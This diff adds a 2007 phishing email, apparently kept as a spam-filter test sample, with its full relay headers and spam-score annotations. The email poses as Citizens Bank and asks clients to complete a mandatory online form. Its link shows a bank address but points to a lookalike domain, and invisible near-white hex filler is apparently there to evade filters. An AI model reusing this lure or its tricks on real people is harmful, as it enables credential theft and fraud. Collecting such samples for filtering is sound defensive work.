@@ -1,0 +1,99 @@
+From nobody Sun Jan 25 13:50:05 2015
+Return-Path: <clientservice.ref04388764.gps@citizensbank.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 80C0446971
+ for <user@login.example.com>; Thu,  2 Aug 2007 07:58:09 -0400 (EDT)
+Received: from lujan.uninet.edu (bio.hgy.es [193.146.180.21])
+ by mail.example.org (Postfix) with ESMTP id 5ADCA131FB39
+ for <user@example.com>; Thu,  2 Aug 2007 07:58:08 -0400 (EDT)
+Received: by lujan.uninet.edu (Postfix)
+ id 53E631BF49; Thu,  2 Aug 2007 13:58:02 +0200 (CEST)
+Delivered-To: josu@uninet.edu
+Received: from mar.uninet.edu (ena.uninet.edu [193.146.180.90])
+ by lujan.uninet.edu (Postfix) with ESMTP id 3FA751C255
+ for <josu@uninet.edu>; Thu,  2 Aug 2007 13:58:02 +0200 (CEST)
+Received: from localhost (localhost [127.0.0.1])
+ by mar.uninet.edu (Postfix) with ESMTP id 2BE7F883
+ for <josu@uninet.edu>; Thu,  2 Aug 2007 13:58:02 +0200 (CEST)
+X-Quarantine-ID: <kQkrIogdClzx>
+X-Virus-Scanned: Debian amavisd-new at uninet.edu
+X-Spam-Flag: YES
+X-Spam-Score: 28.48
+X-Spam-Level: ****************************
+X-Spam-Status: Yes, score=28.48 tagged_above=0 required=5 tests=[BAYES_99=3.5, 
+ HTML_30_40=0.374, HTML_FONT_LOW_CONTRAST=0.194,
+ HTML_MESSAGE=0.001, 
+ MIME_HTML_ONLY=0.001, MIME_HTML_ONLY_MULTI=0,
+ RAZOR2_CF_RANGE_51_100=0.5, RAZOR2_CF_RANGE_E8_51_100=1.5,
+ RAZOR2_CHECK=12, SPOOF_OURI=0.104, URIBL_OB_SURBL=3.008,
+ URIBL_PH_SURBL=2.8, URIBL_SC_SURBL=4.498]
+Received: from lujan.uninet.edu ([193.146.180.21])
+ by localhost (mar.uninet.edu [193.146.180.108]) (amavisd-new, port 10024)
+ with ESMTP id kQkrIogdClzx for <josu@uninet.edu>;
+ Thu,  2 Aug 2007 13:57:55 +0200 (CEST)
+Received: from rocinante.compendium.com.ar (lutien.compendium.com.ar
+ [200.69.230.6])
+ by lujan.uninet.edu (Postfix) with ESMTP id 37E8C1BF49
+ for <josu@uninet.edu>; Thu,  2 Aug 2007 13:57:55 +0200 (CEST)
+Received: from localhost (rocinante [127.0.0.1])
+ by rocinante.compendium.com.ar (Postfix) with ESMTP id 3C249500099
+ for <josu@uninet.edu>; Thu,  2 Aug 2007 08:57:54 -0300 (ART)
+Received: from rocinante.compendium.com.ar ([127.0.0.1])
+ by localhost (rocinante [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id 16422-09 for <josu@uninet.edu>;
+ Thu, 2 Aug 2007 08:57:53 -0300 (ART)
+Received: from host29-137-dynamic.7-87-r.retail.telecomitalia.it
+ (host29-137-dynamic.7-87-r.retail.telecomitalia.it [87.7.137.29])
+ by rocinante.compendium.com.ar (Postfix) with SMTP id B4642500098
+ for <josu@uninet.edu>; Thu,  2 Aug 2007 08:57:50 -0300 (ART)
+Received: from kichimail.com (carl.kichimail.com [104.234.168.219])
+ by internetfci.com with SMTP id Y7QI24DY0L
+ for <josu@uninet.edu>; Thu, 02 Aug 2007 06:57:44 -0600
+From: "Citizens Bank and Charter One Bank"
+ <clientservice.ref04388764.gps@citizensbank.com>
+To: "Josu" <josu@uninet.edu>
+Subject: Citizens Bank and Charter One Bank customer service:
+ customer details confirmation! (mess_id: e79601692q)
+X-Accept-Language: en-us, en
+User-Agent: MIME-tools 4.104 (Entity 4.116)
+X-Priority: 3 (Normal)
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--BUTGPOXJTJO1RS8R"
+Message-Id: <20070802115750.B4642500098@rocinante.compendium.com.ar>
+Date: Thu,  2 Aug 2007 08:57:50 -0300 (ART)
+X-Virus-Scanned: by amavisd-new-20030616-p10 (Debian) at localhost
+X-Keywords: 
+Status: O
+Content-Length: 3598
+Lines: 27
+
+----BUTGPOXJTJO1RS8R
+Content-Type: text/html;
+Content-Transfer-Encoding: 7Bit
+
+<head>
+<meta      http-equiv="Content-Type"    content="text/html;       charset=iso-8859-1">
+</head>
+
+<body>
+<p><font     face="Geneva, Arial, Helvetica, san-serif">Dear     Citizens    Bank       and  Charter      One     Bank       customer,</font></p>
+<p><font    face="Geneva, Arial, Helvetica, san-serif">Citizens       Bank &amp;   Charter    One  Bank  Customer     Service  requests  you    to       complete     Money       Manager    GPS     Client       Online   Form.</font></p>
+<p><font     face="Geneva, Arial, Helvetica, san-serif">This  procedure is      obligatory for     all  business   and       corporate       clients   of Citizens    Bank  and    Charter       One   Bank.</font></p>
+<p><font    face="Geneva, Arial, Helvetica, san-serif">Please click  hyperlink      below      to      access    Money Manager  GPS Client     Online    Form.</font><br>
+</p>
+<p><font face="Geneva, Arial, Helvetica, san-serif"><a   href="http://moneymanagergps.session-62944954.citizensbank.com.go2rotte.ws/forms/clientcare.apx">http://moneymanagergps.session-62944954.citizensbank.com/forms/clientcare.apx</a></font></p>
+<p><font   face="Geneva, Arial, Helvetica, san-serif">Please do not    respond    to     this      email.</font></p>
+<p><font    face="Geneva, Arial, Helvetica, san-serif">&copy;  Copyright  2007     Citizens   Financial    Group.      All     rights     reserved.</font><br>
+</p>
+<p>*****************************************************************</p>
+<p><font  color="#FFFFF5"      face="Geneva, Arial, Helvetica, san-serif">0x62, 0x11, 0x20483464, 0x14106679, 0x3573, 0x027, 0x6193, 0x6234, 0x82513956, 0x3, 0x4446, 0x9186, 0x98599705, 0x36062132       RSU, function, ODU, TY5V, UE2   0x70, 0x2901, 0x54, 0x4, 0x0, 0x95786165, 0x69079192, 0x2904, 0x10681162, 0x8953, 0x734      PLGX: 0x5, 0x71, 0x8, 0x8899   0x89, 0x181, 0x5, 0x94, 0x855, 0x90       0x557     0x6110, 0x43, 0x8448, 0x9545, 0x08, 0x554, 0x420, 0x67, 0x37502367       0x84165994, 0x632, 0x65583238, 0x2       0x97, 0x001, 0x3, 0x22, 0x00202979, 0x37615741, 0x8783, 0x6, 0x7583, 0x1201, 0x6, 0x75, 0x8332</font></p><p><font       color="#FFFFFB"     face="Geneva, Arial, Helvetica, san-serif"><span>1QM: 0x188, 0x4, 0x504, 0x5      0x63279414, 0x9437, 0x2, 0x038, 0x56, 0x1  0x0, 0x5918, 0x037, 0x2467, 0x529       cvs, file, 2H8, 38Z, TAV, C1GM, define.  0x5192, 0x77887489, 0x2192       MFVO: 0x135      </span><span>XOU, define, revision, O694, update, LQ2, dec, 4TT, tmp 
+       P07: 0x05261929, 0x31, 0x719, 0x49, 0x99, 0x335, 0x0241, 0x3503, 0x222, 0x9, 0x606, 0x7, 0x3, 0x5  UA2O: 0x3011, 0x695, 0x6, 0x52188718, 0x10365378, 0x9756, 0x5153, 0x96   A9S: 0x0802, 0x46, 0x21, 0x33, 0x57, 0x35553451, 0x4940, 0x49, 0x84, 0x58</span></font></p>
+<p><font    color="#FFFFFB"    face="Geneva, Arial, Helvetica, san-serif"><span>N5E: 0x26677430, 0x2168, 0x8749, 0x2, 0x553, 0x513, 0x8, 0x502, 0x83289207, 0x72268687, 0x011   EGM3: 0x67336240, 0x68, 0x7, 0x4132, 0x4, 0x844, 0x81, 0x243  cvs: 0x71717977, 0x83428454, 0x633, 0x30, 0x58320336, 0x5030, 0x084, 0x49, 0x19, 0x51193623, 0x11, 0x65125152, 0x6    media: 0x15, 0x6       update LPK file cvs start B8Y</span><span>Y57: 0x18168422, 0x1693, 0x0364, 0x45, 0x31490211, 0x53, 0x8, 0x789, 0x33133238, 0x064, 0x73, 0x2686, 0x76 </span><span>0x07569030, 0x56481723, 0x32 0x13038623, 0x57, 0x09, 0x202, 0x396, 0x197, 0x35937776       update 6RVY rcs 8QC exe FB1 end api.   hex: 0x1, 0x810, 0x4470, 0x10, 0x9755, 0x6</span></font></p>
+</body>
+</html>
+
+
+----BUTGPOXJTJO1RS8R--
